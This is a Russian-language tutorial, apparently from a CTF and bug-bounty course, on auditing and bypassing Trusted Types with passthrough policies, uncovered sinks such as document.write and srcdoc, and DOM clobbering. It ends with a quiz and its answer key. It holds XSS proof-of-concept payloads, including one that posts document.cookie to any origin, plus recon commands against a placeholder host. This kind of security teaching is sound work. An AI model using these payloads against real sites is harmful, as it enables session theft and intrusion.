---
id: web-trusted-types-bypass
title: "Trusted Types и обход клиентских защит"
category: web
parent: web-csp-bypass
difficulty: hard
order: 2
tags: [trusted-types, csp, xss, dom, bypass]
prerequisites: [web-csp-advanced, web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Что такое Trusted Types, как они блокируют DOM-XSS и где остаются дыры: некорректные политики, default policy, DOM clobbering."
---

Trusted Types — это механизм браузера, который превращает **DOM XSS из «случайной» уязвимости в ошибку компиляции**: он запрещает присваивать в опасные DOM-sink'и обычные строки и требует специальный «доверенный» объект. Правильно настроенный Trusted Types действительно закрывает большинство DOM-XSS. Но, как и любая защита, он имеет **крайние случаи, которые оставляют sink'и открытыми**, и именно их ищет тестировщик.

## Что такое Trusted Types

Политика задаётся заголовком `Content-Security-Policy: require-trusted-types-for 'script'` и создаётся в JS:

```js
const p = trustedTypes.createPolicy('default', {
  createHTML: (s) => s,                       // без санитизации — опасно!
  createScript: (s) => s,
  createScriptURL: (s) => s,
});
```

Когда политика активна, браузер требует, чтобы в `innerHTML`, `eval`, `script.src` и другие sink'и попадал не `string`, а результат `p.createHTML(...)` (объект `TrustedHTML`). Попытка передать строку выбрасывает `TypeError`:

```js
el.innerHTML = userInput;              // TypeError: requires TrustedHTML
el.innerHTML = p.createHTML(userInput); // ок — но только если политика безопасна
```

Ключевой момент: **Trusted Types защищает не сам ввод, а канал доставки в sink**. Если политика `default` реализована как тождественная функция (или есть «passthrough»-политика), защита превращается в формальность.

## Почему политики ломаются

Три типичные ошибки конфигурации:

1. **`default`-политика без санитизации** — `createHTML: (s) => s` пропускает любую строку как доверенную.
2. **Passthrough-политика** — код создаёт политику вида `trustedTypes.createPolicy('x', {createHTML: s => s})` и использует её.
3. **Дыры в покрытии** — не все sink'и покрыты (`require-trusted-types-for 'script'` покрывает не всё; например, `Element.setAttribute` для обработчиков не всегда).

## Поиск и обход: базовые проверки

```js
// 1. есть ли политика default и что она делает
trustedTypes.getPolicyNames();          // ["default"]
// 2. если default пасует всё — XSS всё ещё возможен
// 3. искать в исходниках createPolicy
```

```bash
# ищем политики в JS бандлах
katana -u https://t -jc -silent | grep -oE 'https?://[^"]+\.js' | sort -u > js.txt
while read u; do curl -s "$u" | grep -oE "createPolicy\([^)]*" ; done < js.txt
```

Если найдена политика с тождественной функцией, DOM XSS остаётся эксплуатируемым:

```html
<script>
const p = trustedTypes.createPolicy('x', {createHTML: s => s});
document.getElementById('out').innerHTML = p.createHTML(location.hash.slice(1));
</script>
<!-- payload: #<img src=x onerror=alert(1)> -->
```

## Обходы, которые не требуют DOM-sink

Trusted Types блокирует **присваивания строк в sink'и**, но не устраняет сам источник. Остаются векторы:

- **HTML-инъекция через сервер.** Если сервер рендерит HTML и отдаёт его в ответе (reflected/stored), Trusted Types не при чём — XSS срабатывает до JS.
- **`document.write`** в некоторых движках и **`DOMParser`** + последующая вставка.
- **`iframe.srcdoc`**, `srcdoc` не всегда под require-trusted-types.
- **SVG и MathML** — элементы с собственными sink'ами и обработчиками (`<svg><script>`).
- **`javascript:` URL** в навигации — покрывается не везде.
- **`setTimeout`/`setInterval` со строкой** — если движок разрешает.
- **Сторонние библиотеки**, создающие политику-«дырку».

```html
<!-- srcdoc может проскочить -->
<iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>"></iframe>
```

## CSP + Trusted Types вместе

Trusted Types — не замена CSP, а её дополнение. Полезные директивы рядом:

| Директива | Роль |
|-----------|------|
| `require-trusted-types-for 'script'` | запрет строк в sink'ах |
| `trusted-types default` | разрешённые имена политик |
| `trusted-types 'allow-duplicates'` | разрешить дубли имён |
| `script-src 'strict-dynamic'` | доверие скриптам, загруженным доверенным |
| `object-src 'none'` | запрет плагинов |
| `base-uri 'none'` | защита от подмены базы |

Если `trusted-types` не ограничивает имена, любая библиотека может создать свою passthrough-политику. Поэтому важны обе части: и `require-trusted-types-for 'script'`, и явный список `trusted-types`.

## Разобранный пример: оценка реальной защиты

```bash
# 1. проверяем заголовок
$ curl -sI https://t/ | grep -i 'content-security-policy'
content-security-policy: require-trusted-types-for 'script'; trusted-types default

# 2. ищем политику в бандлах
$ curl -s https://t/app.js | grep -oE 'createPolicy\([^;]+'
createPolicy('default', { createHTML: s => DOMPurify.sanitize(s) })

# 3. политика санитизирует -> DOM XSS через innerHTML закрыт
# 4. ищем другие sink'и
$ curl -s https://t/app.js | grep -oE '(eval|setTimeout|document.write|srcdoc)'
document.write(location.search)         # <-- непокрытый sink!
```

Итог: политика хорошая, но `document.write` остаётся каналом. Проверяем его напрямую:

```bash
$ curl -s 'https://t/?q=<img src=x onerror=alert(1)>' | grep -o '<img src=x onerror=alert(1)>'
# если document.write вставил payload в DOM -> XSS подтверждён
```

## Оценка: чек-лист тестировщика

- [ ] Заголовок `require-trusted-types-for 'script'` присутствует.
- [ ] Директива `trusted-types` ограничивает имена (не `*`).
- [ ] Политика `default` действительно санитизирует (DOMPurify и т.п.).
- [ ] Нет passthrough-политик (`createHTML: s => s`).
- [ ] Проверены `eval`, `setTimeout`, `document.write`, `srcdoc`, `javascript:`.
- [ ] Серверные отражения HTML проверены отдельно (TT их не закрывает).
- [ ] Сторонние библиотеки не создают «дырявых» политик.

## Крайние случаи

- **`trusted-types *`** — фактически отключает ограничение имён; любая политика допустима.
- **Report-only режим** — `Content-Security-Policy-Report-Only` не блокирует, только логирует.
- **Политика создаётся позже** — если `createPolicy` вызван после первого sink'а, поведение зависит от движка.
- **Service Worker** может перехватить и переписать ответ, ослабив заголовки.
- **`createScriptURL` без allowlist** — открывает загрузку скриптов с любого URL.

## Что делать дальше / решение

1. **Проверьте заголовок** — есть ли `require-trusted-types-for 'script'` и ограничение `trusted-types`.
2. **Найдите политики** — грепните JS на `createPolicy`; оцените их тела.
3. **Если политика пасует всё** — ищите DOM-sink (`innerHTML`, `eval`, `document.write`, `srcdoc`) и подайте payload.
4. **Если политика безопасна** — проверьте непокрытые sink'и и серверные отражения.
5. **Проверьте сторонние скрипты** — они могут создать «дырявую» политику.
6. **Тупик** — переходите к обычным DOM-XSS-векторам (sink без TT) или к stored/reflected XSS на сервере.

## Справочная таблица

| Sink | Покрыт TT? | Обход, если нет политики |
|------|:----------:|--------------------------|
| `innerHTML` | да | passthrough-политика |
| `outerHTML` | да | passthrough-политика |
| `insertAdjacentHTML` | да | passthrough-политика |
| `document.write` | частично | прямой вызов |
| `eval`/`Function` | да | `createScript` passthrough |
| `script.src` | да | `createScriptURL` без allowlist |
| `iframe.srcdoc` | частично | прямой srcdoc |
| `javascript:` URL | частично | навигация |
| серверный HTML | нет | reflected/stored XSS |

## Trusted Types и DOM clobbering

Отдельная категория обходов возникает, когда защита доверяет «своему» коду, но этот код можно подменить через HTML. DOM clobbering позволяет создать глобальную переменную из именованного элемента (`<form id=...>`, `<img name=...>`) и тем самым перехватить ссылку, которую защита использует как «доверенную». Если приложение берёт, например, `window.trustedTypes` или ссылку на функцию из DOM, clobbering может подсунуть вместо неё управляемый объект.

```html
<!-- перехват глобальной переменной с именем, которое использует код -->
<form id="trustedTypes"><input name="createPolicy"></form>
```

Практически это встречается редко и требует специфической логики приложения, но при аудите всегда проверяйте, не читает ли код «доверенные» ссылки из DOM. В сочетании с `iframe` и `name`-атрибутами clobbering способен обойти проверки, которые кажутся надёжными.

## Разобранный пример: аудит сторонней библиотеки

Библиотеки, добавляющие совместимость с Trusted Types, сами создают политики. Если библиотека создаёт passthrough-политику, она открывает дыру в защите всего приложения.

```bash
# ищем createPolicy во всех бандлах
$ for u in $(cat js.txt); do curl -s "$u"; done | grep -oE "createPolicy\(['\"][a-zA-Z0-9_-]+['\"]"
createPolicy("default", {...})       # политика приложения
createPolicy("dompurify", {...})     # политика библиотеки

# смотрим тело библиотечной политики
$ curl -s https://t/dompurify.js | grep -A3 'createPolicy("dompurify"'
createPolicy("dompurify", { createHTML: s => s })   # passthrough -> дыра!
```

Если найдена passthrough-политика, любой код (в том числе внедрённый через другой вектор) может вызвать `trustedTypes.createPolicy("dompurify").createHTML(payload)` и передать результат в `innerHTML`. Проверяем:

```html
<script>
const p = trustedTypes.createPolicy('dompurify', {createHTML: s => s});
document.getElementById('x').innerHTML = p.createHTML('<img src=x onerror=alert(1)>');
</script>
```

## Оценка: как отличить настоящую защиту от формальной

Настоящая защита — это когда **все sink'и закрыты и все политики санитизируют**. Формальная — когда заголовок есть, но политика пасует всё или есть непокрытый sink. Тестировщик должен проверить три вещи по отдельности: (1) наличие и строгость заголовка, (2) тела всех найденных политик, (3) наличие sink'ов вне покрытия. Провал любой из трёх означает, что DOM XSS остаётся возможным.

Отдельно проверьте режим отчётов: если заголовок стоит в `Content-Security-Policy-Report-Only`, он ничего не блокирует — это фактически отсутствие защиты. Также проверьте, не переопределяет ли Service Worker заголовки на более слабые: SW может подменить ответ и снять `require-trusted-types-for`.

## Итог и типичные ошибки

- **Заголовок есть — значит безопасно.** Нет: без безопасных политик TT обходится passthrough'ом.
- **Только DOM-sink'и.** Серверные отражения HTML TT не закрывает — их надо проверять отдельно.
- **`trusted-types *`.** Разрешает любые имена политик, включая созданные атакующим.
- **Report-only.** Не блокирует, только логирует.
- **Забыли про srcdoc/javascript:.** Покрытие неполное, проверяйте все векторы.
- **Сторонние библиотеки.** Их политики — часть вашей поверхности атаки.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что делает `require-trusted-types-for 'script'`?"
  options:
    - "Заставляет использовать Trusted Types вместо строк в опасных sink'ах"
    - "Шифрует cookies"
    - "Включает CORS"
    - "Отключает HTTPS"
  answer: 0
  explanation: "Присваивание сырой строки в `innerHTML`/`eval` бросает ошибку."
- question: "Где чаще всего дыра в Trusted Types?"
  options:
    - "В слабой или passthrough `default` policy"
    - "В порту сервера"
    - "В DNS"
    - "В cookie"
  answer: 0
  explanation: "`createHTML: s => s` сводит защиту на нет."
- question: "Что такое `createScriptURL`?"
  options:
    - "Метод политики, возвращающий TrustedScriptURL для `script.src`"
    - "SQL-функция"
    - "CSS-правило"
    - "DNS-запись"
  answer: 0
  explanation: "Без валидации он позволяет загрузить внешний скрипт."
- question: "Почему DOM clobbering обходит Trusted Types?"
  options:
    - "TT защищает от строк в sink, но не от подмены данных, читаемых доверенным кодом"
    - "Он отключает CSP"
    - "Он меняет политику"
    - "Он шифрует HTML"
  answer: 0
  explanation: "Clobbering подменяет значение переменной, а не строку в sink."
- question: "Как быстро проверить, активны ли TT?"
  options:
    - "Попробовать `document.body.innerHTML='<img src=x>'` и поймать ошибку"
    - "Сменить User-Agent"
    - "Открыть порт"
    - "Сменить DNS"
  answer: 0
  explanation: "При активных TT присваивание строки бросит `TypeError`."
```

## Где пригодится

- **CTF (Web):** задачи с «современной» защитой, где нужно найти слабую политику.
- **Bug bounty:** обход TT — редкий, но ценный баг в крупных приложениях.
- **Пентест:** аудит CSP + политик Trusted Types.
- **Работа (AppSec/Dev):** правильная политика (санитизация внутри `createHTML`, валидация URL).
